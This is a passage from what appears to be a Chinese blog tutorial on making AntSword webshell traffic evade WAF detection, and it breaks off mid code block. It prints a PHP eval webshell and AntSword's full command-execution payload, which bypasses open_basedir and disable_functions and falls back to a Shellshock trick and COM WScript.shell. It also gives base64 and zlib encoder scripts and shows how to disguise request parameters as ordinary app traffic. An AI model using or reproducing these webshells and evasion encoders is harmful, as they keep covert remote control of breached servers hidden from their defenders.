title="3.编码器与解码器"></a>3.编码器与解码器</h5><h6 id="3-1编码器工作流程"><a href="#3-1编码器工作流程" class="headerlink" title="3.1编码器工作流程"></a>3.1编码器工作流程</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/01 09:42:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data[&#x27;_&#x27;]中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击首先来看一下蚁剑自带的base64编码器，简单解释一下，蚁剑在发送数据包时，会发送键值对的数组，其中pwd为webshell的密码，而data是一个数组，ext为扩展，这里可能比较抽象，<br>假如我们的webshell为<code>&lt;?php eval($_POST[&#39;a&#39;]);?&gt;</code><br>那么它的密码就为a，上面的pwd就为a<br><img src="/images/antsword-bypasswaf/image-20240301094919153.png" alt="image-20240301094919153"></p><p>这里第一个参数为a,那么a的值由谁决定呢，a的值在core-&gt;php下的index.js决定，刚刚上面已经看到了<br><img src="/images/antsword-bypasswaf/image-20240301095341111.png" alt="image-20240301095341111"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);<span class="variable">$opdir</span>=@ini_get(<span class="string">&quot;open_basedir&quot;</span>);<span class="keyword">if</span>(<span class="variable">$opdir</span>) &#123;<span class="variable">$ocwd</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$oparr</span>=preg_split(base64_decode(<span class="string">&quot;Lzt8Oi8=&quot;</span>),<span class="variable">$opdir</span>);@array_push(<span class="variable">$oparr</span>,<span class="variable">$ocwd</span>,sys_get_temp_dir());<span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;<span class="keyword">if</span>(!@is_writable(<span class="variable">$item</span>))&#123;<span class="keyword">continue</span>;&#125;;<span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.8aa9fc8b20&quot;</span>;@mkdir(<span class="variable">$tmdir</span>);<span class="keyword">if</span>(!@file_exists(<span class="variable">$tmdir</span>))&#123;<span class="keyword">continue</span>;&#125;<span class="variable">$tmdir</span>=realpath(<span class="variable">$tmdir</span>);@chdir(<span class="variable">$tmdir</span>);@ini_set(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);<span class="variable">$cntarr</span>=@preg_split(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;sizeof(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++)&#123;@chdir(<span class="string">&quot;..&quot;</span>);&#125;;@ini_set(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);@rmdir(<span class="variable">$tmdir</span>);<span class="keyword">break</span>;&#125;;&#125;;;<span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>.<span class="string">&quot;&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>.<span class="string">&quot;&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;detail&quot;</span>],<span class="number">2</span>));<span class="variable">$s</span>=base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;value&quot;</span>],<span class="number">2</span>));<span class="variable">$envstr</span>=@base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;action&quot;</span>],<span class="number">2</span>));<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;<span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">False</span>;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@unlink(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> <span class="literal">True</span>;&#125;&#125;<span class="keyword">return</span> <span class="literal">False</span>;&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(join(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@pclose(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@fclose(<span class="variable">$io</span>[<span class="number">1</span>]);@fclose(<span class="variable">$io</span>[<span class="number">2</span>]);@proc_close(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>其中这里是传递的功能，比如这里$p=base64_decode(substr($_POST[“detail”],2));$s=base64_decode(substr($_POST[“value”],2));$envstr=@base64_decode(substr($_POST[“action”],2))，传递了参数，这个是index.js引用的tmpcode<br><img src="/images/antsword-bypasswaf/image-20240301100445659.png" alt="image-20240301100445659"></p><p>那么tmpcode是传递的参数，他不是固定的，如果在执行cmd命令时，就会到当前的command.js里<br>传递参数</p><p><img src="/images/antsword-bypasswaf/image-20240301101303575.png" alt="image-20240301101303575">如果执行其他的功能，比如增删改查文件，就会到filemangager，传递那几个arg参数。</p><p>蚁剑默认把传递的参数从2开始取,也即是解码的时候删去两个字符</p><p>detail=K5L2Jpbi9zaA%3D%3D&amp;value=fMY2QgIi93d3cvd3d3cm9vdC9hIjtscztlY2hvIGFmNjMzNjg4N2M3O3B3ZDtlY2hvIGU2MzA0ZDk%3D<br><img src="/images/antsword-bypasswaf/image-20240301101635444.png" alt="image-20240301101635444"></p><p>最下面value的值为我们执行的命令。</p><h6 id="3-2参数修改"><a href="#3-2参数修改" class="headerlink" title="3.2参数修改"></a>3.2参数修改</h6><p>在没有自定义编码器之前，先来看一下蚁剑默认传递执行某些功能时传递的参数，在core-&gt;base.js中定义了arg的写法，</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">argv</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="comment">// 生成一个随机的变量名</span></span><br><span class="line">    <span class="keyword">let</span> random;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.__opts__.otherConf[<span class="string">&quot;use-random-variable&quot;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">      <span class="comment">// 随机返回单词, 排除 body 和 pwd</span></span><br><span class="line">      <span class="keyword">let</span> excludes = <span class="built_in">Object</span>.keys(<span class="built_in">this</span>.__opts__.httpConf.body).concat(<span class="built_in">this</span>.__opts__.pwd);</span><br><span class="line">      <span class="keyword">return</span> antSword[<span class="string">&#x27;utils&#x27;</span>].RandomChoice(antSword[<span class="string">&#x27;RANDOMWORDS&#x27;</span>], excludes, <span class="number">6</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      random = <span class="function">() =&gt;</span> <span class="string">`<span class="subst">$&#123;antSword[<span class="string">&#x27;utils&#x27;</span>].RandomLowercase()&#125;</span><span class="subst">$&#123;(<span class="built_in">Math</span>.random() + <span class="built_in">Math</span>.random()).toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>; <span class="comment">// 返回六个随机变量名数组</span></span><br><span class="line">      <span class="keyword">return</span> [</span><br><span class="line">        random(),</span><br><span class="line">        random(),</span><br><span class="line">        random(),</span><br><span class="line">        random(),</span><br><span class="line">        random(),</span><br><span class="line">        random()</span><br><span class="line">      ];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里可以看到定义的argv函数，random为<code>Math.random() + Math.random()).toString(16).substr(2)&#125;</code>也就是随机10个字符传递参数的时候就是这样的<br><img src="/images/antsword-bypasswaf/image-20240301110342753.png" alt="image-20240301110342753"></p><p>这种或许已经被某些厂商标记了，或许吧，不太清楚，稍微改一下。这里我们伪装成正常那种流量，比如传递参数的时候键的设置，<br><img src="/images/antsword-bypasswaf/image-20240301113444397.png" alt="image-20240301113444397"></p><p>随便找了一个微信的他的这种名称是那种常用的，name，key，view 似乎正常一点   ，笔者在这里找了几个常用的关键字， </p><p><img src="/images/antsword-bypasswaf/image-20240301134047863.png" alt="image-20240301134047863"></p><p>直接给他替换掉，把random，注释了即可。这里改完配置文件要重启一下蚁剑</p><p><img src="/images/antsword-bypasswaf/image-20240301134310508.png" alt="image-20240301134310508"></p><p>这个时候就把键给改了，直接给定死了，就是那几个值。<br><img src="/images/antsword-bypasswaf/image-20240301134351168.png" alt="image-20240301134351168"></p><p>这里第一个传参是webshell的密码，建议密码设置的时候给他设置成常见的单词，更完美一些。</p><h6 id="3-2自定义编码器"><a href="#3-2自定义编码器" class="headerlink" title="3.2自定义编码器"></a>3.2自定义编码器</h6><p>官方给出的base64编码器，先来看一下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::base64编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2024/03/01 09:42:00</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="comment">// 以下代码为 PHP Base64 样例</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 生成一个随机变量名</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`_0x<span class="subst">$&#123;<span class="built_in">Math</span>.random().toString(<span class="number">16</span>).substr(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">  <span class="comment">// 原有的 payload 在 data[&#x27;_&#x27;]中</span></span><br><span class="line">  <span class="comment">// 取出来之后，转为 base64 编码并放入 randomID key 下</span></span><br><span class="line">  data[randomID] = Buffer.from(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// shell 在接收到 payload 后，先处理 pwd 参数下的内容，</span></span><br><span class="line">  data[pwd] = <span class="string">`eval(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>]));`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 删除 _ 原有的payload</span></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="comment">// 返回编码器处理后的 payload 数组</span></span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pwd为密码，data为编码器处理前的payload数组，这里是数组，</p><p><img src="/images/antsword-bypasswaf/image-20240301140159287.png" alt="image-20240301140159287"></p><p><img src="/images/antsword-bypasswaf/image-20240301140209040.png" alt="image-20240301140209040"></p><p>用流量看一下，密码为a，a=eval(base64_decode(%24_POST%5B_0xc1c4783e9a6cf%5D))%3B，自己造了一个randomID，然后传递这个id的值，base64解码，这样就把原来的payload，就是@ini_set(“display_errors”, “0”);@set_time_limit(0);$opdir=@ini_get(“open_basedir”);if($opdir) 开头的一大串给base64掉了，就不会检测到了。而value和detail这些参数还是在payload中，</p><p><img src="/images/antsword-bypasswaf/image-20240301140732128.png" alt="image-20240301140732128"></p><p>就还是需要操作的。</p><p>笔者这里用一个网上学来的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * php::zlib_deflated_raw 编码器</span></span><br><span class="line"><span class="comment"> * Create at: 2019/01/12 00:05:44</span></span><br><span class="line"><span class="comment"> * zlib 压缩 payload, 适配 shell 见代码处</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> zlib = <span class="built_in">require</span>(<span class="string">&#x27;zlib&#x27;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @param  &#123;String&#125; pwd   连接密码</span></span><br><span class="line"><span class="comment">* @param  &#123;Array&#125;  data  编码器处理前的 payload 数组</span></span><br><span class="line"><span class="comment">* @return &#123;Array&#125;  data  编码器处理后的 payload 数组</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">pwd, data, ext=&#123;&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  ext.opts.httpConf.headers[<span class="string">&#x27;User-Agent&#x27;</span>]=<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)&#x27;</span>;</span><br><span class="line">   <span class="comment">//设置ua</span></span><br><span class="line">  <span class="comment">// ##########    请在下方编写你自己的代码   ###################</span></span><br><span class="line">  <span class="keyword">let</span> randomID = <span class="string">`ceshi`</span>;</span><br><span class="line">  data[randomID] = zlib.deflateRawSync(data[<span class="string">&#x27;_&#x27;</span>]).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  <span class="comment">// 英语单词列表</span></span><br><span class="line">  <span class="comment">// const wordList = [&#x27;apple&#x27;, &#x27;banana&#x27;, &#x27;car&#x27;, &#x27;dog&#x27;, &#x27;elephant&#x27;, &#x27;flower&#x27;];</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // 生成一个随机索引</span></span><br><span class="line">  <span class="comment">// const randomIndex = randomInt(0, wordList.length - 1);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // 获取随机单词</span></span><br><span class="line">  <span class="comment">// const randomWord = wordList[randomIndex];</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// // 在调用模块之前，将随机单词添加到 data 对象中</span></span><br><span class="line">  <span class="comment">// data[&#x27;123&#x27;] = randomWord;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 调用模块并传入 data 对象</span></span><br><span class="line"><span class="comment">// 处理返回的结果</span></span><br><span class="line"><span class="comment">// 这里的 processedData 即为处理后的 payload 数据</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// &lt;?php @eval($_POST[&#x27;ant&#x27;]);?&gt;</span></span><br><span class="line">  <span class="comment">//data[pwd] = `eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); ?&gt;</span></span><br><span class="line">  data[pwd] = zlib.deflateRawSync(<span class="string">`@eval(@gzinflate(base64_decode($_POST[<span class="subst">$&#123;randomID&#125;</span>])));`</span>).toString(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// &lt;?php @eval(@gzinflate(base64_decode($_POST[&#x27;ant&#x27;]))); ?&gt;</span></span><br><span class="line">  <span class="comment">// data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[$&#123;randomID&#125;])));`).toString(&#x27;base64&#x27;);</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// ##########    请在上方编写你自己的代码   ###################</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">delete</span> data[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概意思就是把pwd传的参数和randomid给用zlib压缩一下。<br>这里写入webshell的时候有小小的变化，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 